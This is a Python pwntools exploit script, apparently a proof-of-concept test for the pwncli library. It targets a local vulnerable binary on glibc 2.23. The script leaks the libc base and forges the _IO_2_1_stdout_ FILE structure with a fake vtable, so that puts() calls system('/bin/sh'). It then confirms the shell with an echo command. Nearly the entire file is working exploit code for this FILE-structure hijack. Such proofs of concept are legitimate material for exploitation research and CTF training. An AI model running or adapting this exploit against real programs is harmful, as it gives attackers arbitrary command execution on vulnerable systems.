"""getshell_from_IO_puts_by_stdout_libc_2_23 的 POC（libc 2.23）

Technique: Forge _IO_2_1_stdout_ so that IO_puts calls system("/bin/sh")
through the vtable. In libc 2.23, there's no vtable validation.

Trigger: Any puts() call after forging stdout, or exit() -> _IO_flush_all_lockp
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from pwn import *
from pwncli.utils.toolkit.io_file import IO_FILE_plus_struct
from helper import *

context.arch = "amd64"
context.log_level = "info"

GLIBC_VERSION = "2.23-0ubuntu11.3"
BINARY_NAME = "vuln_puts_2.23-0ubuntu11.3"


def exploit():
    binary = os.path.join(TESTS_DIR, BINARY_NAME)
    libc_path = get_libc_path(GLIBC_VERSION)
    io = process(binary)
    elf = ELF(binary, checksec=False)
    libc = ELF(libc_path, checksec=False)

    libc.address = leak_libc_base(io, libc)
    log.success(f"libc base: {hex(libc.address)}")

    system = libc.sym['system']
    _IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']

    # Read the current _lock value from stdout
    pid = io.pid
    with open(f'/proc/{pid}/mem', 'rb') as f:
        f.seek(_IO_2_1_stdout_ + 0x88)
        lock_addr = u64(f.read(8))

    log.info(f"_IO_2_1_stdout_: {hex(_IO_2_1_stdout_)}")
    log.info(f"system: {hex(system)}")
    log.info(f"lock: {hex(lock_addr)}")

    fake_file = IO_FILE_plus_struct()
    payload = fake_file.getshell_from_IO_puts_by_stdout_libc_2_23(
        stdout_store_addr=_IO_2_1_stdout_,
        system_addr=system,
        lock_addr=lock_addr,
    )

    # Overwrite _IO_2_1_stdout_ with our forged FILE
    arb_write(io, _IO_2_1_stdout_, payload)

    # Trigger via puts() - option 6 calls puts("triggered")
    # After overwriting stdout, we can't use sendlineafter since output is corrupted
    log.info("Triggering puts()...")
    io.sendline(b"6")

    io.sendline(b"echo PWNED")
    try:
        result = io.recvuntil(b"PWNED", timeout=3)
        if b"PWNED" in result:
            log.success("getshell_from_IO_puts_by_stdout_libc_2_23: SUCCESS")
            io.close()
            return True
    except:
        pass

    log.failure("getshell_from_IO_puts_by_stdout_libc_2_23: FAILED")
    io.close()
    return False


if __name__ == "__main__":
    result = exploit()
    sys.exit(0 if result else 1)
